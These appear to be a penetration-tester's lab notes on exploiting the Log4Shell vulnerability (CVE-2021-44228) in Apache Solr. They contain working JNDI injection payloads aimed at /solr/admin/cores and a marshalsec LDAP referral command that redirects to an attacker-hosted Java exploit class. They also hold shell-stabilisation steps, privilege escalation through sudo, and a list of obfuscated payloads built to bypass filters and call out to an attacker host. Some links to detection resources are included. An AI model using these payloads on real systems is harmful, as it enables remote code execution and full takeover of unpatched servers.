# Solar log4j (log4 shell)

`export ip=10.10.33.179`



## recon
nmap : `nmap -v -p- 10.10.33.179 -oN recon/nmap`

## discovery & payload
- apache solr in port `8983`
- you could supply `params` to the `/solr/admin/cores` URL: send any HTTP GET param to use `${jndi:ldap://ATTACKERCONTROLLEDHOST}`

## marshalsec redirect ldap to http
- LDAP Referral Server
- `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server
- python3 -m http.server to host the java class exploit
- must use java 1.8.0
- `mvn clean package -DskipTests`
- we can start an LDAP referral server to direct connections to our secondary HTTP server: `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8888/#Exploit"`
### Exploit.java
- see `payload/Exploit.java`
- compile it with java 1.8.0: `/home/th3m7j0/Downloads/programs/openlogic-openjdk-8u262-b10-linux-64/bin/javac Exploit.java -source 8 -target 8`
- run simple HTTP server with python: `python3 -m http.server 8888`

## shell persistance:
- `python3 -c "import pty; pty.spawn('/bin/bash')"`
- `stty raw -echo`
- ctrl+z
- fg + enter
- `export TERM=xterm`

## we have root permission
- sudo -l -> `ALL`
- sudo bash

## resources
- https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes (local, based off hashes of log4j JAR files)
- https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d (local, based off hashes of log4j CLASS files)
- https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228 (listing of vulnerable JAR and CLASS hashes)
- https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1 (local, hunting for vulnerable log4j packages in PowerShell)
- https://github.com/darkarnium/CVE-2021-44228 (local, YARA rules)
- As a reminder, a massive resource is available here: 

https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/

## bypass
```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}
```